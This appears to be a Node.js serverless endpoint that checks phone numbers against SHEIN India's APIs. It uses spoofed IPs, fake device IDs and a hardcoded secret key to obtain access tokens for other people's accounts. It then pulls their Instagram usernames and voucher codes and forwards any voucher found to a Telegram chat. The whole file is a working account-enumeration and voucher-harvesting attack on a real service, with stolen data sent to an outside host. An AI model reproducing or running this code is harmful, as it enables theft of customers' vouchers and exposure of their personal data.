// api/check.js
const axios = require('axios');
const https = require('https');

// Custom axios instance with better error handling
const api = axios.create({
    timeout: 30000,
    httpsAgent: new https.Agent({  
        rejectUnauthorized: false
    }),
    maxRedirects: 5,
    validateStatus: function (status) {
        return status >= 200 && status < 500; // Accept all status codes to handle errors
    }
});

// Add response interceptor for debugging
api.interceptors.response.use(
    response => response,
    error => {
        if (error.response) {
            // The request was made and the server responded with a status code
            // that falls out of the range of 2xx
            console.error('Response Error:', {
                status: error.response.status,
                headers: error.response.headers,
                data: error.response.data
            });
        } else if (error.request) {
            // The request was made but no response was received
            console.error('No response received:', error.request);
        } else {
            // Something happened in setting up the request that triggered an Error
            console.error('Request Error:', error.message);
        }
        return Promise.reject(error);
    }
);

async function sendToTelegram(message, botToken, chatId) {
    if (!botToken || !chatId || botToken === 'YOUR_BOT_TOKEN' || chatId === 'YOUR_CHAT_ID') {
        return false;
    }
    
    try {
        await api.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        return true;
    } catch (error) {
        console.error('Telegram send error:', error.message);
        return false;
    }
}

function generateRandomIp() {
    return `${Math.floor(Math.random() * 100 + 100)}.${Math.floor(Math.random() * 240 + 10)}.${Math.floor(Math.random() * 240 + 10)}.${Math.floor(Math.random() * 249 + 1)}`;
}

function generateDeviceId() {
    return Array.from({ length: 16 }, () => 
        Math.floor(Math.random() * 16).toString(16)
    ).join('');
}

function generateRequestId() {
    return `req_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

async function httpCall(url, data = null, headers = [], method = 'GET') {
    try {
        const headerObj = {};
        headers.forEach(header => {
            const [key, value] = header.split(': ');
            headerObj[key] = value;
        });

        // Add default headers if not present
        if (!headerObj['Accept-Encoding']) {
            headerObj['Accept-Encoding'] = 'gzip, deflate';
        }
        if (!headerObj['Accept-Language']) {
            headerObj['Accept-Language'] = 'en-US,en;q=0.9';
        }
        if (!headerObj['Connection']) {
            headerObj['Connection'] = 'keep-alive';
        }

        const config = {
            method: method.toLowerCase(),
            url: url,
            headers: headerObj,
            maxRedirects: 5,
            timeout: 30000,
            decompress: true
        };

        if (method.toUpperCase() === 'POST') {
            if (typeof data === 'string' && headerObj['Content-Type']?.includes('application/x-www-form-urlencoded')) {
                config.data = data;
            } else {
                config.data = data;
            }
        } else if (data && typeof data === 'object') {
            config.params = data;
        }

        const response = await api(config);
        
        // Log response info for debugging
        console.log(`URL: ${url}, Status: ${response.status}, Content-Type: ${response.headers['content-type']}`);
        
        return response.data;
    } catch (error) {
        console.error(`HTTP Call Error for ${url}:`, error.message);
        if (error.response) {
            return error.response.data;
        }
        throw error;
    }
}

async function checkNumber(number, botToken, chatId) {
    const ip = generateRandomIp();
    const adId = generateDeviceId();
    const requestId = generateRequestId();

    console.log(`\n=== Checking number: ${number} ===`);
    console.log(`IP: ${ip}, Device ID: ${adId}`);

    try {
        // Step 1: Get access token
        console.log('Step 1: Getting access token...');
        const tokenUrl = "https://api.services.sheinindia.in/uaas/jwt/token/client";
        const tokenHeaders = [
            "Client_type: Android/29",
            "Accept: application/json",
            "Client_version: 1.0.8",
            "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; SM-G977N Build/PPR1.180610.011)",
            "X-Tenant-Id: SHEIN",
            `Ad_id: ${adId}`,
            "X-Tenant: B2C",
            "Content-Type: application/x-www-form-urlencoded",
            `X-Forwarded-For: ${ip}`,
            `X-Request-ID: ${requestId}`
        ];

        const tokenData = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
        let tokenRes;
        
        try {
            tokenRes = await httpCall(tokenUrl, tokenData, tokenHeaders, "POST");
        } catch (error) {
            console.error('Token API error:', error.message);
            return { status: 'error', error: 'Token API failed', number };
        }

        // Check if response is HTML
        if (typeof tokenRes === 'string' && tokenRes.trim().startsWith('<!DOCTYPE')) {
            console.error('Received HTML instead of JSON from token API');
            return { status: 'error', error: 'API returned HTML - possible blocking', number };
        }

        let tokenJson;
        try {
            tokenJson = typeof tokenRes === 'string' ? JSON.parse(tokenRes) : tokenRes;
        } catch (e) {
            console.error('Failed to parse token response:', tokenRes?.substring(0, 200));
            return { status: 'error', error: 'Invalid token response', number };
        }

        const access_token = tokenJson.access_token;
        if (!access_token) {
            console.error('No access token in response:', tokenJson);
            return { status: 'error', error: 'No access token', number };
        }

        console.log('Access token obtained');

        // Step 2: Account check
        console.log('Step 2: Checking account...');
        const accountUrl = "https://api.services.sheinindia.in/uaas/accountCheck";
        const accountHeaders = [
            `Authorization: Bearer ${access_token}`,
            `Requestid: account_check_${Date.now()}`,
            "X-Tenant: B2C",
            "Accept: application/json",
            "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; SM-G977N Build/PPR1.180610.011)",
            "Client_type: Android/29",
            "Client_version: 1.0.8",
            "X-Tenant-Id: SHEIN",
            `Ad_id: ${adId}`,
            "Content-Type: application/x-www-form-urlencoded",
            `X-Forwarded-For: ${ip}`
        ];

        const accountData = `mobileNumber=${number}`;
        const accountUrlWithParams = `${accountUrl}?client_type=Android%2F29&client_version=1.0.8`;
        
        let accountRes;
        try {
            accountRes = await httpCall(accountUrlWithParams, accountData, accountHeaders, "POST");
        } catch (error) {
            console.error('Account check API error:', error.message);
            return { status: 'error', error: 'Account check failed', number };
        }

        // Check if response is HTML
        if (typeof accountRes === 'string' && accountRes.trim().startsWith('<!DOCTYPE')) {
            console.error('Received HTML instead of JSON from account API');
            return { status: 'error', error: 'API returned HTML - possible blocking', number };
        }

        let accountJson;
        try {
            accountJson = typeof accountRes === 'string' ? JSON.parse(accountRes) : accountRes;
        } catch (e) {
            console.error('Failed to parse account response:', accountRes?.substring(0, 200));
            return { status: 'error', error: 'Invalid account response', number };
        }

        // Check if account exists
        if (accountJson.success === false || accountJson.code === 4003) {
            console.log('Number not registered');
            return { status: 'not_registered', number };
        }

        const encryptedId = accountJson.encryptedId;
        if (!encryptedId) {
            console.error('No encryptedId in response:', accountJson);
            return { status: 'error', error: 'No encrypted ID', number };
        }

        console.log('Account exists, encryptedId obtained');

        // Step 3: Generate token
        console.log('Step 3: Generating SHEINverse token...');
        const generateTokenUrl = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token";
        const generateTokenHeaders = [
            "Accept: application/json",
            "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; SM-G977N Build/PPR1.180610.011)",
            "Client_type: Android/29",
            "Client_version: 1.0.8",
            "X-Tenant-Id: SHEIN",
            `Ad_id: ${adId}`,
            "Content-Type: application/json; charset=UTF-8",
            `X-Forwarded-For: ${ip}`
        ];

        const payload = {
            client_type: "Android/29",
            client_version: "1.0.8",
            gender: "",
            phone_number: number,
            secret_key: "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
            user_id: encryptedId,
            user_name: ""
        };

        let generateTokenRes;
        try {
            generateTokenRes = await httpCall(generateTokenUrl, JSON.stringify(payload), generateTokenHeaders, "POST");
        } catch (error) {
            console.error('Generate token API error:', error.message);
            return { status: 'registered_no_voucher', number }; // Assume registered but no voucher if this fails
        }

        // Check if response is HTML
        if (typeof generateTokenRes === 'string' && generateTokenRes.trim().startsWith('<!DOCTYPE')) {
            console.error('Received HTML from generate token API');
            return { status: 'registered_no_voucher', number };
        }

        let generateTokenJson;
        try {
            generateTokenJson = typeof generateTokenRes === 'string' ? JSON.parse(generateTokenRes) : generateTokenRes;
        } catch (e) {
            console.log('Failed to parse generate token response - assuming registered but no voucher');
            return { status: 'registered_no_voucher', number };
        }

        const sheinverse_access_token = generateTokenJson.access_token;
        if (!sheinverse_access_token) {
            console.log('No access token in generate token response');
            return { status: 'registered_no_voucher', number };
        }

        console.log('SHEINverse token obtained');

        // Step 4: Get user data
        console.log('Step 4: Getting user data...');
        const userUrl = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user";
        const userHeaders = [
            `Authorization: Bearer ${sheinverse_access_token}`,
            "User-Agent: Mozilla/5.0 (Linux; Android 15; SM-S938B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/140.0.7339.207 Mobile Safari/537.36",
            "Accept: application/json, text/plain, */*",
            "Origin: https://sheinverse.galleri5.com",
            "X-Requested-With: com.ril.shein",
            "Referer: https://sheinverse.galleri5.com/",
            `X-Forwarded-For: ${ip}`,
            "Accept-Language: en-US,en;q=0.9",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive"
        ];

        let userRes;
        try {
            userRes = await httpCall(userUrl, null, userHeaders, "GET");
        } catch (error) {
            console.error('User data API error:', error.message);
            return { status: 'registered_no_voucher', number };
        }

        // Check if response is HTML
        if (typeof userRes === 'string' && userRes.trim().startsWith('<!DOCTYPE')) {
            console.error('Received HTML from user data API');
            return { status: 'registered_no_voucher', number };
        }

        let userJson;
        try {
            userJson = typeof userRes === 'string' ? JSON.parse(userRes) : userRes;
        } catch (e) {
            console.error('Failed to parse user data response:', userRes?.substring(0, 200));
            return { status: 'registered_no_voucher', number };
        }

        // Check if we have instagram data
        if (!userJson.user_data?.instagram_data?.username) {
            console.log('No instagram data found');
            return { status: 'registered_no_voucher', number };
        }

        const username = userJson.user_data.instagram_data.username;
        const voucherData = userJson.user_data.voucher_data || {};
        
        // Check if voucher exists
        if (!voucherData.voucher_code) {
            console.log('No voucher found');
            return { 
                status: 'registered_no_voucher', 
                number,
                instagram: username 
            };
        }

        // Voucher found!
        const result = {
            status: 'success',
            number,
            instagram: username,
            voucherCode: voucherData.voucher_code,
            voucherAmount: voucherData.voucher_amount || 'N/A',
            minPurchase: voucherData.min_purchase_amount || 'N/A',
            expiry: voucherData.expiry_date || 'N/A'
        };

        console.log('✅ VOUCHER FOUND!', result);

        // Send to Telegram
        if (botToken && chatId) {
            const telegramMessage = `
🎉 <b>VOUCHER FOUND!</b> 🎉

📱 <b>Number:</b> <code>${number}</code>
📸 <b>Instagram:</b> ${username}
🎫 <b>Voucher Code:</b> <code>${voucherData.voucher_code}</code>
💰 <b>Amount:</b> ₹${voucherData.voucher_amount || 'N/A'}
🛒 <b>Min Purchase:</b> ₹${voucherData.min_purchase_amount || 'N/A'}
⏰ <b>Expiry:</b> ${voucherData.expiry_date || 'N/A'}

<a href='https://t.me/share/url?url=${voucherData.voucher_code}'>Share Voucher</a>
            `;
            
            await sendToTelegram(telegramMessage, botToken, chatId);
        }

        return result;

    } catch (error) {
        console.error('Unexpected error in checkNumber:', error);
        return { status: 'error', error: error.message, number };
    }
}

module.exports = async (req, res) => {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { number, botToken, chatId } = req.body;

    if (!number) {
        return res.status(400).json({ error: 'Number is required' });
    }

    // Validate phone number format
    if (!/^\d{10}$/.test(number)) {
        return res.status(400).json({ error: 'Invalid phone number format' });
    }

    try {
        console.log(`Processing request for number: ${number}`);
        const result = await checkNumber(number, botToken, chatId);
        
        // Add CORS headers to response
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.json(result);
    } catch (error) {
        console.error('API Error:', error);
        res.status(500).json({ 
            status: 'error', 
            error: error.message,
            number 
        });
    }
};
